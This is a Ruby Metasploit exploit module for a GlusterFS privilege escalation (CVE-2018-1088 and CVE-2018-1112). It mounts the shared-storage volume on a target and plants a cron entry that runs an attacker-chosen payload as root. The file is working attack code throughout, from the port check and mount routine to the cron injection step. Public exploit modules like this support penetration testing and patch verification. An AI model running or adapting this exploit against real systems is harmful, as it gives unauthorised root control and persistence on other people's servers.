##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GlusterFS: Privilege escalation via gluster_shared_storage',
        'Description' => %q{
          A flaw was found in gluster snapshot scheduler.
          Any client allowed to mount gluster volumes could also mount shared gluster storage volume and escalate privileges.
        },
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'License' => MSF_LICENSE,
        'Author' =>
              [
                'Mauro Eldritch (plaguedoktor)'
              ],
        'References' =>
              [
                [ 'CVE', '2018-1088' ],
                [ 'CVE', '2018-1112' ],
                [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-1088' ],
                [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-1112' ],
                [ 'URL', 'https://github.com/mauroeldritch/Gevaudan' ]
              ],
        'DefaultOptions' =>
                      {
                        'Payload' => 'linux/x86/exec'
                      },
        'Platform' => [ 'linux' ],
        'Targets' =>
              [
                ['glusterfs-server 3.8.8-1', {}]
              ],
        'DisclosureDate' => 'Mar 20 2018',
        'DefaultTarget' => 0
      )
  )

    register_options(
      [
        OptString.new('RHOST', [ true, 'Remote host to attack', '127.0.0.1']),
        OptString.new('GLUSTERMNT', [ true, 'Directory where the vulnerable volume will be mounted', '/tmp/gevaudan']),
        OptString.new('GLUSTERBIN', [ true, 'Path to mount.glusterfs binary', '/sbin/mount.glusterfs']),
        OptString.new('GLUSTERVOL', [ true, 'Gluster Volume to mount', 'gluster_shared_storage']),
        OptString.new('GLUSTERCRON', [ true, 'Path to Gluster cron file', '/snaps/glusterfs_snap_cron_tasks'])
      ]
    )
  end

  def check
    gluster_ports = [49152, 49153, 49154, 49155, 49156]
    gluster_host = datastore['RHOST']
    gluster_binary = datastore['GLUSTERBIN']
    # Check if binary exists
    if File.file?(gluster_binary) == false
      print_error "Gluster mount binary (#{gluster_binary}) not found."
    end
    open_ports = 0
    gluster_ports.each do |port|
      begin
          Socket.tcp(gluster_host.to_s, port, connect_timeout: 2) do
            open_ports += 1
            print_good(port + ' is open.')
          end
      rescue StandardError
        false
        end
    end
    if open_ports == 0
      print_error(gluster_host + " doesn't seem to be reachable or running gluster.")
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Appears
    end
  end

  def exploit
    gluster_host = datastore['RHOST']
    gluster_mount = datastore['GLUSTERMNT']
    gluster_binary = datastore['GLUSTERBIN']
    gluster_volume = datastore['GLUSTERVOL']
    gluster_cron = datastore['GLUSTERCRON']
    gluster_payload = datastore['CMD']
    # Create mount point folder if doesn't exist.
    begin
          Dir.mkdir gluster_mount.to_s
    rescue StandardError
      false
        end
    # Attempt to connect to Gluster.
    print_line "Attempting to exploit Gluster instance on #{gluster_host}..."
    gluster_connect_cmd = "#{gluster_binary} #{gluster_host}:/#{gluster_volume} #{gluster_mount}"
    gluster_output = cmd_exec gluster_connect_cmd.to_s
    if gluster_output == true
      print_good "Volume #{gluster_host}:/#{gluster_volume} exploited successfully. Mounted on '#{gluster_mount}'."
      print_line 'Volume content (Showing latest 10 entries only):'
      gluster_test_cmd = cmd_exec "ls -ltrh #{gluster_mount} | tail -10"
      print_line gluster_test_cmd.to_s
    else
      print_error "Error running exploit. Check glusterfs-client logs at '/var/log/glusterfs/' for debug info."
    end
    # Final strike, add a crontab entry
    begin
      path = "#{gluster_mount}#{gluster_cron}"
      data = "0 6 * * * #{gluster_payload}"
      write_file path, data
      print_good "Cron file '#{gluster_mount}#{gluster_cron}' altered successfully."
      gluster_cron_cmd = cmd_exec "cat #{gluster_mount}#{gluster_cron}"
      print_good 'Cron file injected entry:'
      print_good(gluster_cron_cmd)
      print_good "This will run as root on #{gluster_host}.\n\nDon't forget to unmount #{gluster_mount} after use."
    rescue StandardError
      print_error "Unable to inject entries into '#{gluster_mount}#{gluster_cron}'."
    end
  end
end
